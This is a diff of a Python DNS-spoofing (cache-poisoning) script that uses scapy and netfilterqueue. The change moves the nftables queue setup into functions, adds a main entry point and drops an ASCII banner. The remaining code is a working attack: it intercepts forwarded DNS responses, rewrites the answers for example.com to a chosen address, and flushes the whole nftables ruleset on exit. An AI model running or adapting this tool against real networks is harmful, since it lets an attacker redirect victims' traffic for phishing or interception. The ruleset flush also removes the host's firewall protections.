@@ -8,21 +8,9 @@ DNS cache poisoning
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
-import subprocess
 
-# Inspiration : https://www.thepythoncode.com/article/make-dns-spoof-python
 
-# Need to apply this ruleset with nftables : This rule indicates that whenever a packet is forwarded, redirect it ( -j for jump ) to the netfilter queue number 0. This will enable us to redirect all the forwarded packets into Python. 
-
-def display_banner():
-    print("""  _____  _   _  _____   _____   ____ _____  _____  ____  _   _ _____ _   _  _____ 
-    |  __ \| \ | |/ ____| |  __ \ / __ \_   _|/ ____|/ __ \| \ | |_   _| \ | |/ ____|
-    | |  | |  \| | (___   | |__) | |  | || | | (___ | |  | |  \| | | | |  \| | |  __ 
-    | |  | | . ` |\___ \  |  ___/| |  | || |  \___ \| |  | | . ` | | | | . ` | | |_ |
-    | |__| | |\  |____) | | |    | |__| || |_ ____) | |__| | |\  |_| |_| |\  | |__| |
-    |_____/|_| \_|_____/  |_|     \____/_____|_____/ \____/|_| \_|_____|_| \_|\_____|
-    """)
-
+# Constants
 dns_hosts = {
     b"example.com.": "10.12.0.10",
     b"www.example.com.": "10.12.0.10",
@@ -62,7 +50,7 @@ def modify_packet(packet):
     del packet[IP].chksum
     del packet[UDP].len
     del packet[UDP].chksum
-    # return the modified packet
+
     return packet
 
 def process_packet(packet):
@@ -84,27 +72,35 @@ def process_packet(packet):
         print("[After ]:", scapy_packet.summary())
         # set back as netfilter queue packet
         packet.set_payload(bytes(scapy_packet))
-    # accept the packet
+
     packet.accept()
 
-display_banner()
 
-QUEUE_NUM = 0
+def add_rules(): 
+    # Add a ruleset for the netfilterqueue using nftables
+    print("[+] Adding ruleset for netfilterqueue...")
+    os.system(f"nft add table inet filter")
+    os.system(f"nft add chain inet filter forward {{ type filter hook forward priority 0 \; }}")
+    os.system(f"nft add rule inet filter forward queue num {QUEUE_NUM}")
 
-# Add a ruleset for the netfilterqueue using nftables
-print("[+] Adding ruleset for netfilterqueue...")
-os.system(f"nft add table inet filter")
-os.system(f"nft add chain inet filter forward {{ type filter hook forward priority 0 \; }}")
-os.system(f"nft add rule inet filter forward queue num {QUEUE_NUM}")
 
-# Instantiate the netfilter queue
-queue = NetfilterQueue()
 
-try:
-    # Bind the queue number to our callback `process_packet` and start it
-    queue.bind(QUEUE_NUM, process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    # If you want to exit, make sure you remove the ruleset you just inserted, going back to normal.
-    print("[+] Flushing rulesets...")
-    os.system("nft flush ruleset")
+def main(): 
+    # Adding nft rules
+    add_rules() 
+
+    # Instantiate the netfilter queue
+    queue = NetfilterQueue()
+
+    try:
+        # Bind the queue number to our callback `process_packet` and start it
+        queue.bind(QUEUE_NUM, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        # If you want to exit, make sure you remove the ruleset you just inserted, going back to normal.
+        print("[+] Flushing rulesets...")
+        os.system("nft flush ruleset")
+
+if __name__ == "__main__":
+    QUEUE_NUM = 0
+    main()
